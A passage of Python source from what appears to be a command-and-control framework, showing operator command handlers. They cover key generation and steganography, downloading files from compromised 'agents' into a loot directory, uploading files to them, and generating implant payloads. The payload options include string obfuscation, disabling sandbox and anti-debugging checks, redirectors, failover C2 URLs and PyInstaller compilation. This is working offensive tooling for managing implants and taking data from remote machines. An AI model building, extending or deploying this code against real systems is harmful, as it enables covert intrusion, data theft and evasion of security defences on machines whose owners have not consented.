        aes       - Generate AES key (requires password=<pwd>)
        rsa       - Generate RSA key pair
        xor       - Generate XOR key (optional: length=<bytes>)

    OPTIONS:
        password=<pwd>      - Password for AES key derivation
        length=<bytes>      - Length for XOR key (default: 32)
        output=<prefix>     - Output prefix for key files

    EXAMPLES:
        encryption keygen rsa output=my_rsa
        encryption keygen xor length=64
        encryption keygen aes password=mypass123
            """, 'error'
        
        algorithm = command_parts[1].lower()
        
        options = {}
        for part in command_parts[2:]:
            if '=' in part:
                key, value = part.split('=', 1)
                options[key.lower()] = value
        
        try:
            encryption_manager = self.get_encryption_manager()
            
            if algorithm == 'fernet':
                key = base64.urlsafe_b64encode(os.urandom(32))
                
                if 'output' in options:
                    output_path = f"{options['output']}.key"
                    with open(output_path, 'wb') as f:
                        f.write(key)
                    return f"Fernet key generated and saved to: {output_path}", 'success'
                else:
                    return f"Fernet Key:\n{key.decode('utf-8')}", 'success'
                    
            elif algorithm == 'aes':
                if 'password' not in options:
                    return "AES key generation requires password=<pwd> option", 'error'
                
                password = options['password']
                key, salt = encryption_manager.generate_aes_key(password)
                
                output = f"AES Key generated!\n"
                output += f"Key (hex): {key.hex()}\n"
                output += f"Salt (base64): {base64.b64encode(salt).decode('utf-8')}"
                
                if 'output' in options:
                    output_path = f"{options['output']}_aes.key"
                    with open(output_path, 'w') as f:
                        f.write(f"Key: {key.hex()}\n")
                        f.write(f"Salt: {base64.b64encode(salt).decode('utf-8')}\n")
                    return f"AES key saved to: {output_path}", 'success'
                
                return output, 'success'
                
            elif algorithm == 'rsa':
                private_key, public_key = encryption_manager.generate_rsa_key_pair()
                
                if 'output' in options:
                    prefix = options['output']
                    private_path = f"{prefix}_private.pem"
                    public_path = f"{prefix}_public.pem"
                    
                    with open(private_path, 'wb') as f:
                        f.write(private_key)
                    with open(public_path, 'wb') as f:
                        f.write(public_key)
                    
                    return f"RSA key pair generated!\nPrivate key: {private_path}\nPublic key: {public_path}", 'success'
                else:
                    output = f"RSA Key Pair Generated!\n\n"
                    output += f"Private Key:\n{private_key.decode('utf-8')}\n\n"
                    output += f"Public Key:\n{public_key.decode('utf-8')}"
                    return output, 'success'
                    
            elif algorithm == 'xor':
                length = int(options.get('length', 32))
                key = self.get_encryption_manager().generate_xor_key(length)
                
                if 'output' in options:
                    output_path = f"{options['output']}_xor.key"
                    with open(output_path, 'w') as f:
                        f.write(key.hex())
                    return f"XOR key generated and saved to: {output_path}", 'success'
                else:
                    return f"XOR Key (hex):\n{key.hex()}", 'success'
                    
            else:
                return f"Unknown key generation algorithm: {algorithm}", 'error'
                
        except Exception as e:
            return f"Key generation error: {str(e)}", 'error'

    def handle_steganography(self, command_parts):
        if len(command_parts) < 2:
            return """
    USAGE:
        encryption stego hide <image_path> <data> <output_path> [key=<key>]
        encryption stego extract <image_path> [key=<key>]

    DESCRIPTION:
        Hide or extract data from images using LSB steganography

    EXAMPLES:
        encryption stego hide image.png "Secret Message" stego_image.png
        encryption stego extract stego_image.png
            """, 'error'
        
        operation = command_parts[1].lower()
        
        try:
            encryption_manager = self.get_encryption_manager()
            
            if operation == 'hide':
                if len(command_parts) < 5:
                    return "Usage: encryption stego hide <image_path> <data> <output_path> [key=<key>]", 'error'
                
                image_path = command_parts[2]
                data = command_parts[3]
                output_path = command_parts[4]
                
                # Parse options
                options = {}
                for part in command_parts[5:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key.lower()] = value
                
                if not os.path.exists(image_path):
                    return f"Image file not found: {image_path}", 'error'
                
                key = None
                if 'key' in options:
                    key = bytes.fromhex(options['key'])
                else:
                    key = encryption_manager.generate_steganography_key()
                
                success = encryption_manager.hide_data_in_image(image_path, data, output_path, key)
                
                if success:
                    return f"Data hidden successfully in: {output_path}\nKey (hex): {key.hex()}", 'success'
                else:
                    return "Failed to hide data in image", 'error'
                    
            elif operation == 'extract':
                if len(command_parts) < 3:
                    return "Usage: encryption stego extract <image_path> [key=<key>]", 'error'
                
                image_path = command_parts[2]
                
                options = {}
                for part in command_parts[3:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key.lower()] = value
                
                if not os.path.exists(image_path):
                    return f"Image file not found: {image_path}", 'error'
                
                key = None
                if 'key' in options:
                    key = bytes.fromhex(options['key'])
                else:
                    key = encryption_manager.generate_steganography_key()
                
                extracted_data = encryption_manager.extract_data_from_image(image_path, key)
                
                return f"Extracted Data:\n{extracted_data}", 'success'
                
            else:
                return f"Unknown steganography operation: {operation}", 'error'
                
        except Exception as e:
            return f"Steganography error: {str(e)}", 'error'

    def handle_hmac(self, command_parts):
        if len(command_parts) < 2:
            return """
    USAGE:
        encryption hmac generate <data> [key=<key>]
        encryption hmac verify <data> <hmac> [key=<key>]

    DESCRIPTION:
        Generate or verify HMAC signatures

    EXAMPLES:
        encryption hmac generate "Important Data" key=deadbeef
        encryption hmac verify "Important Data" <hmac_hex> key=deadbeef
            """, 'error'
        
        operation = command_parts[1].lower()
        
        try:
            encryption_manager = self.get_encryption_manager()
            
            if operation == 'generate':
                if len(command_parts) < 3:
                    return "Usage: encryption hmac generate <data> [key=<key>]", 'error'
                
                data = command_parts[2]
                
                options = {}
                for part in command_parts[3:]:
                    if '=' in part:
                        k, v = part.split('=', 1)
                        options[k.lower()] = v
                
                if 'key' in options:
                    key = bytes.fromhex(options['key'])
                else:
                    key = os.urandom(32)
                
                hmac_value = encryption_manager.generate_hmac(data, key)
                
                output = f"HMAC generated!\n"
                output += f"HMAC (hex): {hmac_value.hex()}\n"
                output += f"Key (hex): {key.hex()}"
                
                return output, 'success'
                
            elif operation == 'verify':
                if len(command_parts) < 4:
                    return "Usage: encryption hmac verify <data> <hmac> [key=<key>]", 'error'
                
                data = command_parts[2]
                hmac_hex = command_parts[3]
                
                # Parse options
                options = {}
                for part in command_parts[4:]:
                    if '=' in part:
                        k, v = part.split('=', 1)
                        options[k.lower()] = v
                
                if 'key' not in options:
                    return "HMAC verification requires key=<key> option", 'error'
                
                key = bytes.fromhex(options['key'])
                hmac_value = bytes.fromhex(hmac_hex)
                
                is_valid = encryption_manager.verify_hmac(data, key, hmac_value)
                
                if is_valid:
                    return "HMAC verification: VALID ✓", 'success'
                else:
                    return "HMAC verification: INVALID ✗", 'error'
                    
            else:
                return f"Unknown HMAC operation: {operation}", 'error'
                
        except Exception as e:
            return f"HMAC error: {str(e)}", 'error'

    def handle_list(self, command_parts):
        output = """
    Available Encryption Capabilities:
    ════════════════════════════════════════════════════════════════════

    SYMMETRIC ENCRYPTION:
      • Fernet      - High-level symmetric encryption (recommended)
      • AES         - Advanced Encryption Standard (password-based)
      • XOR         - Simple XOR cipher (fast, low security)

    ASYMMETRIC ENCRYPTION:
      • RSA         - Public-key cryptography (2048-bit)

    STEGANOGRAPHY:
      • LSB         - Least Significant Bit image steganography

    MESSAGE AUTHENTICATION:
      • HMAC        - Hash-based Message Authentication Code (SHA-256)

    KEY GENERATION:
      • Fernet keys
      • AES keys (password-derived with PBKDF2)
      • RSA key pairs (2048-bit)
      • XOR keys (custom length)
      • Steganography keys

    Use 'encryption help' for detailed command usage.
        """
        return output.strip(), 'info'

    def handle_download_command(self, command_parts, session):
        if len(command_parts) < 2:
            return "Usage: download <agent_id> <remote_file_path> (for agent downloads) OR download <server_file_path> (for server downloads)", "error"

        if len(command_parts) == 2:
            file_path = command_parts[1]

            if '/' in file_path or '\\' in file_path or file_path.lower().endswith(('.log', '.txt', '.json', '.csv', '.loot', '.dat')):
                return self._handle_server_file_download(file_path)
            else:
                # Check if in interactive mode and current agent exists, then try to use it
                if session.interactive_mode and session.current_agent:
                    agent_id = session.current_agent
                    remote_path = command_parts[1]

                    if session.agent_manager.is_agent_locked_interactively(agent_id):
                        lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                        if lock_info and lock_info['operator'] != session.username:
                            return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", "error"

                    if not session.agent_manager:
                        return "Agent manager not initialized for this session.", "error"

                    # Execute download command using interactive API for immediate response
                    download_command = f"download {remote_path}"
                    interactive_result, error = session.agent_manager.send_interactive_command(
                        agent_id, download_command, timeout=120
                    )

                    if error:
                        return f"Error executing download: {error}", "error"

                    if interactive_result is not None:
                        # Process the download result to save file to loot directory
                        try:
                            import os
                            import base64
                            from datetime import datetime

                            # Create loot directory if it doesn't exist
                            loot_dir = os.path.join(os.getcwd(), "loot")
                            os.makedirs(loot_dir, exist_ok=True)

                            # Extract original file path to create a meaningful filename
                            original_file_path = os.path.basename(remote_path).replace('/', '_').replace('\\', '_')

                            # Generate a timestamp-based filename to avoid duplicates
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            file_extension = os.path.splitext(original_file_path)[1] if os.path.splitext(original_file_path)[1] else ".dat"

                            # Check if the result looks like an error message
                            if interactive_result.startswith('[ERROR]') or interactive_result.startswith('[ERROR'):
                                # This is an error message, not base64 content
                                loot_filename = f"download_error_{timestamp}_{original_file_path.replace('.', '_')}.txt"
                                loot_path = os.path.join(loot_dir, loot_filename)
                                with open(loot_path, 'w') as f:
                                    f.write(interactive_result)
                                loot_result_msg = f"Download error saved to: {loot_path}"
                            else:
                                # This should be base64 encoded content - try to decode it
                                try:
                                    decoded_data = base64.b64decode(interactive_result)
                                    loot_filename = f"download_{timestamp}_{original_file_path}"
                                    loot_path = os.path.join(loot_dir, loot_filename)

                                    with open(loot_path, 'wb') as f:
                                        f.write(decoded_data)

                                    loot_result_msg = f"Downloaded file saved to: {loot_path} ({len(decoded_data)} bytes)"
                                except Exception:
                                    # If decoding fails, save as raw content
                                    loot_filename = f"download_raw_{timestamp}_{original_file_path.replace('.', '_')}.txt"
                                    loot_path = os.path.join(loot_dir, loot_filename)
                                    with open(loot_path, 'w') as f:
                                        f.write(interactive_result)
                                    loot_result_msg = f"Raw download content saved to: {loot_path}"

                            return f"[DOWNLOAD COMPLETED] {loot_result_msg}\nOriginal remote path: {remote_path}", "success"
                        except Exception as e:
                            return f"Download completed but error saving to loot directory: {str(e)}\nResult: {interactive_result[:200]}{'...' if len(interactive_result) > 200 else ''}", "warning"
                    else:
                        return "No response from agent", "warning"
                else:
                    return "Usage: download <agent_id> <remote_file_path> (for agent downloads) OR download <server_file_path> (for server downloads)", "error"

        elif len(command_parts) == 3:
            agent_id = command_parts[1]

            if session.agent_manager.is_agent_locked_interactively(agent_id):
                lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                if lock_info and lock_info['operator'] != session.username:
                    return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", "error"

            remote_path = command_parts[2]

            # If this agent is the current session agent and we're in interactive mode, use interactive API
            if session.interactive_mode and session.current_agent == agent_id:
                # Execute download command using interactive API for immediate response
                download_command = f"download {remote_path}"
                interactive_result, error = session.agent_manager.send_interactive_command(
                    agent_id, download_command, timeout=120
                )

                if error:
                    return f"Error executing download: {error}", "error"

                if interactive_result is not None:
                    # Process the download result to save file to loot directory
                    try:
                        import os
                        import base64
                        from datetime import datetime

                        # Create loot directory if it doesn't exist
                        loot_dir = os.path.join(os.getcwd(), "loot")
                        os.makedirs(loot_dir, exist_ok=True)

                        # Extract original file path to create a meaningful filename
                        original_file_path = os.path.basename(remote_path).replace('/', '_').replace('\\', '_')

                        # Generate a timestamp-based filename to avoid duplicates
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        file_extension = os.path.splitext(original_file_path)[1] if os.path.splitext(original_file_path)[1] else ".dat"

                        # Check if the result looks like an error message
                        if interactive_result.startswith('[ERROR]') or interactive_result.startswith('[ERROR'):
                            # This is an error message, not base64 content
                            loot_filename = f"download_error_{timestamp}_{original_file_path.replace('.', '_')}.txt"
                            loot_path = os.path.join(loot_dir, loot_filename)
                            with open(loot_path, 'w') as f:
                                f.write(interactive_result)
                            loot_result_msg = f"Download error saved to: {loot_path}"
                        else:
                            # This should be base64 encoded content - try to decode it
                            try:
                                decoded_data = base64.b64decode(interactive_result)
                                loot_filename = f"download_{timestamp}_{original_file_path}"
                                loot_path = os.path.join(loot_dir, loot_filename)

                                with open(loot_path, 'wb') as f:
                                    f.write(decoded_data)

                                loot_result_msg = f"Downloaded file saved to: {loot_path} ({len(decoded_data)} bytes)"
                            except Exception:
                                # If decoding fails, save as raw content
                                loot_filename = f"download_raw_{timestamp}_{original_file_path.replace('.', '_')}.txt"
                                loot_path = os.path.join(loot_dir, loot_filename)
                                with open(loot_path, 'w') as f:
                                    f.write(interactive_result)
                                loot_result_msg = f"Raw download content saved to: {loot_path}"

                        return f"[DOWNLOAD COMPLETED] {loot_result_msg}\nOriginal remote path: {remote_path}", "success"
                    except Exception as e:
                        return f"Download completed but error saving to loot directory: {str(e)}\nResult: {interactive_result[:200]}{'...' if len(interactive_result) > 200 else ''}", "warning"
                else:
                    return "No response from agent", "warning"
            else:
                # Use the original queued approach for non-interactive mode
                if not session.agent_manager:
                    return "Agent manager not initialized for this session.", "error"

                agent_command = remote_path

                task_result = session.agent_manager.add_download_task(agent_id, agent_command)
                if task_result and task_result.get('success'):
                    task_id = task_result['task_id']
                    return f" Download task for '{remote_path}' queued for agent {agent_id[:8]}... (Task ID: {task_id})", "success"
                else:
                    error_msg = task_result.get('error', 'Unknown error') if task_result else 'Failed to create task'
                    return f" Failed to queue download task for agent {agent_id[:8]}: {error_msg}", "error"
        else:
            return "Usage: download <agent_id> <remote_file_path> (for agent downloads) OR download <server_file_path> (for server downloads)", "error"

    def _handle_server_file_download(self, file_path):
        import os
        if '..' in file_path or './' in file_path:
            return "Invalid file path", "error"
        
        allowed_directories = ['logs', 'loot', 'config', 'profiles']
        is_allowed = any(file_path.startswith(directory + '/') or file_path.startswith(directory + '\\') or 
                        os.path.basename(file_path) == file_path for directory in allowed_directories)
        
        if not is_allowed and '/' in file_path and '\\' in file_path:
            path_parts = file_path.replace('\\', '/').split('/')
            if path_parts[0] not in allowed_directories:
                return "Access to this directory is restricted", "error"
        
        if ('/' not in file_path and '\\' not in file_path) or file_path.split('/')[0] in allowed_directories:
            pass
        else:
            base_dir = os.path.dirname(file_path)
            if base_dir not in allowed_directories:
                return "Access to this directory is restricted", "error"
        
        resolved_path = os.path.abspath(file_path)
        base_dir = os.path.abspath('.')
        if not resolved_path.startswith(base_dir):
            return "Invalid file path", "error"
        
        if not os.path.exists(file_path):
            return f"File not found: {file_path}", "error"
        
        if os.path.isdir(file_path):
            return f"Path is a directory, not a file: {file_path}", "error"
        
        try:
            with open(file_path, 'rb') as f:
                file_content = f.read()
            
            encoded_content = base64.b64encode(file_content).decode('utf-8')
            
            result = {
                'type': 'file_download',
                'filename': os.path.basename(file_path),
                'content': encoded_content,
                'size': len(file_content)
            }
            
            return json.dumps(result), "file_download"
            
        except Exception as e:
            return f"Error reading file: {str(e)}", "error"

    def handle_upload_command(self, command_parts, session):
        if len(command_parts) == 3 and session.interactive_mode and session.current_agent:
            # Handle: upload <local_file_path> <remote_file_path> in interactive mode
            agent_id = session.current_agent
            local_path = command_parts[1]
            remote_path = command_parts[2]
        elif len(command_parts) == 4:
            # Handle: upload <agent_id> <local_file_path> <remote_file_path>
            agent_id = command_parts[1]
            local_path = command_parts[2]
            remote_path = command_parts[3]
        else:
            return "Usage: upload <agent_id> <local_file_path> <remote_file_path> OR upload <local_file_path> <remote_file_path> (in interactive mode)", "error"

        if session.agent_manager.is_agent_locked_interactively(agent_id):
            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
            if lock_info and lock_info['operator'] != session.username:
                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", "error"

        if not session.agent_manager:
            return "Agent manager not initialized for this session.", "error"

        if not os.path.exists(local_path):
            return f"Local file not found on C2 server: {local_path}", "error"

        try:
            with open(local_path, "rb") as f:
                file_content = f.read()
            encoded_content = base64.b64encode(file_content).decode('utf-8')

            # Format the upload command as expected by the agent: "upload <remote_path> <encoded_content>"
            agent_command = f"upload {remote_path} {encoded_content}"

            # If in interactive mode and this is the current agent, use interactive API for immediate response
            if session.interactive_mode and session.current_agent == agent_id:
                interactive_result, error = session.agent_manager.send_interactive_command(
                    agent_id, agent_command, timeout=120
                )

                if error:
                    return f"Error executing upload: {error}", "error"

                if interactive_result is not None:
                    formatted_result = str(interactive_result).strip()
                    if len(formatted_result) > 10000:  # Truncate very long results
                        formatted_result = formatted_result[:10000] + "\n... (truncated)"
                    return f"[+] Interactive upload completed:\n{formatted_result}", "success"
                else:
                    return "Upload command sent but no response from agent", "warning"
            else:
                # Use the existing add_task method to create the proper task (original behavior)
                task_result = session.agent_manager.add_task(agent_id, agent_command)

                if task_result and task_result.get('success'):
                    task_id = task_result['task_id']
                    return f" Upload task for '{os.path.basename(local_path)}' -> '{remote_path}' queued for agent {agent_id[:8]}... (Task ID: {task_id})", "success"
                else:
                    error_msg = task_result.get('error', 'Unknown error') if task_result else 'Failed to create task'
                    return f" Failed to queue upload task for agent {agent_id[:8]}: {error_msg}", "error"

        except Exception as e:
            return f" An error occurred during file upload preparation: {e}", "error"

    def handle_profile_command(self, command_parts, session):
        if len(command_parts) < 2:
            return """
PROFILE MANAGEMENT COMMANDS
═══════════════════════════════════════════════════════════════════

COMMANDS:
  • profile add <path>                - Add a new communication profile from a JSON file
  • profile add base64:<encoded_json> - Add a new communication profile from base64 encoded JSON
  • profile list                      - List all communication profiles in the database
  • profile reload <path> <name>      - Reload an existing profile with changes from a JSON file

EXAMPLES:
  • profile add /path/to/profile.json
  • profile add base64:eyJuYW1lIjoiTXlQcm9maWxlIiwiY29uZmlnIjp7fX0=
  • profile reload /path/to/updated.json MyProfile
""", "info"

        action = command_parts[1].lower()

        if action == 'add':
            if len(command_parts) < 3:
                return "Usage: profile add <path_to_json> OR profile add base64:<base64_encoded_json>", "error"

            profile_source = command_parts[2]

            try:
                if profile_source.startswith('base64:'):
                    encoded_data = profile_source[7:]  # Remove 'base64:' prefix
                    json_bytes = base64.b64decode(encoded_data)
                    json_str = json_bytes.decode('utf-8')
                    profile_data = json.loads(json_str)
                else:
                    json_path = profile_source

                    if not os.path.exists(json_path) or not json_path.lower().endswith('.json'):
                        return f"Invalid JSON file path: {json_path}", "error"

                    with open(json_path, 'r') as f:
                        profile_data = json.load(f)

                name = profile_data.get('name')
                if not name:
                    return "Profile JSON must contain a 'name' field", "error"

                description = profile_data.get('description', '')
                config = profile_data.get('config', {})

                if not isinstance(config, dict):
                    return "Profile config must be a dictionary object", "error"

                config_str = json.dumps(config)

                profile_id = self.db.add_profile(name, description, config_str)

                return f"Profile '{name}' added successfully with ID: {profile_id}", "success"

            except FileNotFoundError:
                return f"Profile file not found: {profile_source}", "error"
            except base64.binascii.Error:
                return "Invalid base64 encoded data", "error"
            except json.JSONDecodeError as e:
                return f"Invalid JSON in profile data: {str(e)}", "error"
            except ValueError as e:
                return f"Profile error: {str(e)}", "error"
            except Exception as e:
                return f"Error adding profile: {str(e)}", "error"

        elif action == 'list':
            try:
                profiles = self.db.get_all_profiles()

                if not profiles:
                    return "No profiles found in the database.", "info"

                output = "Communication Profiles:\n"
                output += "-" * 100 + "\n"
                output += f"{'ID':<38} {'Name':<20} {'Description':<30}\n"
                output += "-" * 100 + "\n"

                for profile in profiles:
                    profile_id = profile.get('id', 'N/A')
                    name = profile.get('name', 'N/A')
                    description = profile.get('description', 'N/A')

                    # Truncate description if too long
                    if len(description) > 28:
                        description = description[:25] + "..."

                    output += f"{profile_id:<38} {name:<20} {description:<30}\n"

                return output, "success"

            except Exception as e:
                return f"Error listing profiles: {str(e)}", "error"

        elif action == 'reload':
            if len(command_parts) < 4:
                return "USAGE: profile reload <profile_path> <profile_name>", "error"

            profile_path = command_parts[2]
            profile_name = command_parts[3]

            try:
                if not os.path.exists(profile_path) or not profile_path.lower().endswith('.json'):
                    return f"Invalid JSON file path: {profile_path}", "error"

                with open(profile_path, 'r') as f:
                    profile_data = json.load(f)

                name = profile_data.get('name')
                if not name:
                    return "Profile JSON must contain a 'name' field", "error"

                description = profile_data.get('description', '')
                config = profile_data.get('config', {})

                if not isinstance(config, dict):
                    return "Profile config must be a dictionary object", "error"

                config_str = json.dumps(config)

                self.db.update_profile_by_name(profile_name, description, config_str)

                return f"Profile '{profile_name}' successfully reloaded from {profile_path}", "success"

            except FileNotFoundError:
                return f"Profile file not found: {profile_path}", "error"
            except json.JSONDecodeError as e:
                return f"Invalid JSON in profile data: {str(e)}", "error"
            except ValueError as e:
                return f"Profile error: {str(e)}", "error"
            except Exception as e:
                return f"Error reloading profile: {str(e)}", "error"

        else:
            return f"Unknown profile action: {action}. Available actions: add, list, reload", "error"

    def handle_payload_command(self, command_parts, session):

        if len(command_parts) < 3:
            return """
PAYLOAD GENERATION COMMANDS
═══════════════════════════════════════════════════════════════════

SYNTAX:
  • payload <type> <listener_name> [options]

AVAILABLE PAYLOAD TYPES:
  • phantom_hawk_agent   - Python agent
  • go_agent             - Go agent compiled to Windows executable

OPTIONS:
  • --obfuscate          - Enable string obfuscation 
  • --disable-sandbox    - Disable sandbox/antidebugging checks
  • --output <filename>  - Save payload to file (optional)
  • --linux              - Compile payload to Linux binary
  • --windows            - Compile payload to Windows binary
  • --redirector         - Use redirector host and port from profile instead of C2 URL
  • --use-failover       - Embed failover C2 URLs from profile into agent

EXAMPLES:
  • payload phantom_hawk_agent <listener_name> [--obfuscate] [--disable-sandbox] [--linux] [--redirector] [--use-failover]
  • payload go_agent <listener_name> [--obfuscate] [--disable-sandbox] [--windows] [--redirector] [--use-failover]
            """, 'info'

        payload_type = command_parts[1].lower()
        listener_name = command_parts[2]
        
        options = {
            'obfuscate': False,
            'disable_sandbox': False,
            'output': None,
            'linux': False,
            'windows': False,
            'redirector': False,
            'use_failover': False
        }

        i = 3
        while i < len(command_parts):
            option = command_parts[i].lower()
            if option == '--obfuscate':
                options['obfuscate'] = True
            elif option == '--disable-sandbox':
                options['disable_sandbox'] = True
            elif option == '--linux':
                options['linux'] = True
            elif option == '--windows':
                options['windows'] = True
            elif option == '--redirector':
                options['redirector'] = True
            elif option == '--use-failover':
                options['use_failover'] = True
            elif option == '--output' and i + 1 < len(command_parts):
                options['output'] = command_parts[i + 1]
                i += 1
            i += 1

        listener = self.db.get_listener_by_name(listener_name)
        if not listener:
            return f"Listener '{listener_name}' not found", 'error'

        try:
            from agents.payload_generator import PayloadGenerator

            payload_generator = PayloadGenerator(self.config, self.db)

            # Determine platform for go_agent
            if payload_type == 'go_agent':
                if options['linux']:
                    platform = 'linux'
                elif options['windows']:
                    platform = 'windows'
                else:
                    # Default to windows for backward compatibility
                    platform = 'windows'
            else:
                platform = 'windows'  # Default for other payload types

            generated_result = payload_generator.generate_payload(
                listener['id'],
                payload_type,
                obfuscate=options['obfuscate'],
                disable_sandbox=options['disable_sandbox'],
                platform=platform,
                use_redirector=options['redirector'],
                use_failover=options['use_failover']
            )

            if payload_type == 'go_agent':
                output_path = generated_result
                payload_code = ""
            elif payload_type == 'phantom_hawk_agent':
                payload_code = generated_result
                import os
                import subprocess
                import tempfile
                from datetime import datetime

                logs_dir = 'logs'
                if not os.path.exists(logs_dir):
                    os.makedirs(logs_dir)

                if options['output']:
                    output_path = options['output']
                else:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe_listener_name = listener_name.replace(" ", "_").replace("/", "_").replace("\\", "_").replace("|", "_")

                    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as temp_file:
                        temp_file.write(payload_code)
                        temp_file_path = temp_file.name

                    compile_success = False
                    attempts = 0
                    max_attempts = 5

                    while not compile_success and attempts < max_attempts:
                        try:
                            result = subprocess.run(['python', '-m', 'py_compile', temp_file_path],
                                                  capture_output=True, text=True, timeout=10)
                            if result.returncode == 0:
                                compile_success = True
                            else:
                                generated_result = payload_generator.generate_payload(
                                    listener['id'],
                                    payload_type,
                                    obfuscate=options['obfuscate'],
                                    disable_sandbox=options['disable_sandbox'],
                                    platform=platform,
                                    use_redirector=options['redirector'],
                                    use_failover=options['use_failover']
                                )
                                payload_code = generated_result
                                with open(temp_file_path, 'w') as temp_file:
                                    temp_file.write(payload_code)
                                attempts += 1
                        except subprocess.TimeoutExpired:
                            generated_result = payload_generator.generate_payload(
                                listener['id'],
                                payload_type,
                                obfuscate=options['obfuscate'],
                                disable_sandbox=options['disable_sandbox'],
                                platform=platform,
                                use_redirector=options['redirector'],
                                use_failover=options['use_failover']
                            )
                            payload_code = generated_result
                            with open(temp_file_path, 'w') as temp_file:
                                temp_file.write(payload_code)
                            attempts += 1

                    if not compile_success:
                        os.unlink(temp_file_path)
                        return "Failed to generate a syntactically correct payload after multiple attempts", 'error'

                    python_filename = f"payload_{safe_listener_name}_{payload_type}_{timestamp}.py"
                    python_path = os.path.join(logs_dir, python_filename)
                    with open(python_path, 'w', encoding='utf-8') as f:
                        f.write(payload_code)

                    if options['linux']:
                        try:
                            import os
                            import sys

                            # Look for PyInstaller in multiple possible locations
                            possible_paths = [
                                'pyinstaller',
                                # System Python environment
                                os.path.join(os.path.dirname(sys.executable), 'pyinstaller'),
                                # Pip install --user location
                                os.path.join(os.path.expanduser('~/.local/bin'), 'pyinstaller'),
                                # Installation paths after deployment (try both absolute and relative)
                                '/opt/neoc2/.venv/bin/pyinstaller',
                                '/usr/local/bin/pyinstaller',
                                '/usr/bin/pyinstaller'
                            ]
                            current_install_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                            if current_install_dir.rstrip('/') in ['/opt/neoc2']:
                                local_pyinstaller = os.path.join(current_install_dir, '.venv', 'bin', 'pyinstaller')
                                possible_paths.insert(4, local_pyinstaller)  # Insert at position 4

                            pyinstaller_cmd = None
                            for path in possible_paths:
                                if path != 'pyinstaller':
                                    if os.path.exists(path):
                                        pyinstaller_cmd = path
                                        break
                                else:
                                    try:
                                        result = subprocess.run([path, '--version'],
                                                              capture_output=True, text=True, timeout=5)
                                        if result.returncode == 0:
                                            pyinstaller_cmd = path
                                            break
                                    except FileNotFoundError:
                                        continue

                            if pyinstaller_cmd is None:
                                return "PyInstaller is not installed or not accessible", 'error'

                            result = subprocess.run([pyinstaller_cmd, '--version'],
                                                  capture_output=True, text=True, timeout=10)
                            if result.returncode != 0:
                                return "PyInstaller is not installed or not accessible", 'error'

                            with tempfile.TemporaryDirectory() as temp_dir:
                                temp_script_path = os.path.join(temp_dir, 'agent.py')
                                with open(temp_script_path, 'w', encoding='utf-8') as f:
                                    f.write(payload_code)

                                result = subprocess.run([
                                    pyinstaller_cmd, '--onefile', '--name', f'agent_{timestamp}',
                                    '--distpath', logs_dir, temp_script_path
                                ], capture_output=True, text=True, timeout=120)

                                if result.returncode != 0:
                                    return f"PyInstaller failed: {result.stderr}", 'error'

                                agent_exe_path = os.path.join(logs_dir, f'agent_{timestamp}')
                                if os.path.exists(agent_exe_path):
                                    output_path = agent_exe_path
                                    if os.path.exists(python_path):
                                        os.remove(python_path)
                                    for temp_file in os.listdir(logs_dir):
                                        if temp_file.startswith(f'payload_{safe_listener_name}_{payload_type}_') and temp_file.endswith('.py'):
                                            if os.path.join(logs_dir, temp_file) != output_path:
                                                try:
                                                    os.remove(os.path.join(logs_dir, temp_file))
                                                except:
                                                    pass
                                else:
                                    return f"Could not find compiled executable at {agent_exe_path}", 'error'
                        except subprocess.TimeoutExpired:
                            return "PyInstaller timed out during compilation", 'error'
                        except Exception as e:
                            return f"Error during Linux binary compilation: {str(e)}", 'error'

                    elif options['windows']:
                        if os.path.exists(temp_file_path):
                            os.unlink(temp_file_path)
                        return "Cross-compilation to Windows is not supported. Please compile the Python script on a Windows host using PyInstaller: pyinstaller --onefile agent.py", 'info'

                    else:
                        output_path = python_path
                        if os.path.exists(temp_file_path):
                            os.unlink(temp_file_path)
            else:
                payload_code = generated_result
                import os
                from datetime import datetime

                logs_dir = 'logs'
                if not os.path.exists(logs_dir):
                    os.makedirs(logs_dir)

                if options['output']:
                    output_path = options['output']
                else:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe_listener_name = listener_name.replace(" ", "_").replace("/", "_").replace("\\", "_").replace("|", "_")
                    if payload_type in ['phantom_hawk_agent']:
                        ext = '.py'
                    elif payload_type == 'go_agent':
                        if options['linux']:
                            ext = ''
                        else:
                            ext = '.exe'
                    else:
                        ext = '.txt'

                    filename = f"payload_{safe_listener_name}_{payload_type}_{timestamp}{ext}"
                    output_path = os.path.join(logs_dir, filename)
                    

            try:
                if payload_type == 'phantom_hawk_agent' and not options['linux']:
                    pass
                elif payload_type != 'go_agent':
                    with open(output_path, 'w', encoding='utf-8') as f:
                        f.write(payload_code)

                import os
                size = os.path.getsize(output_path)
                if payload_type == 'go_agent':
                    size_str = f"{size} bytes (compiled executable)"
                elif payload_type == 'phantom_hawk_agent' and options['linux']:
                    size_str = f"{size} bytes (compiled executable)"
                elif payload_type == 'phantom_hawk_agent':
                    size_str = f"{size} bytes"
                else:
                    size_str = f"{size} bytes"
                
                output = f"""
Payload Generated Successfully!
Type: {payload_type}
Listener: {listener_name}
Size: {size_str}
Saved to: {output_path}
File location: {os.path.abspath(output_path)}
                
Use 'download' command or access the file directly from the server.
                """.strip()
                
                return output, 'success'
            except Exception as e:
                error_msg = f"Failed to save payload to {output_path}: {str(e)}"
                self.logger.error(error_msg)
                
                if options['output']:
                    return error_msg, 'error'
                else:
                    return error_msg, 'error'
            
        except Exception as e:
            return f"Error generating payload: {str(e)}", 'error'

    def handle_payload_upload_command(self, command_parts, session):
        if len(command_parts) < 2:
            return """
PAYLOAD UPLOAD COMMANDS
═══════════════════════════════════════════════════════════════════

COMMANDS:
  • payload_upload upload <file>    - Upload a payload file for stagers
  • payload_upload status           - Check status of uploaded payload
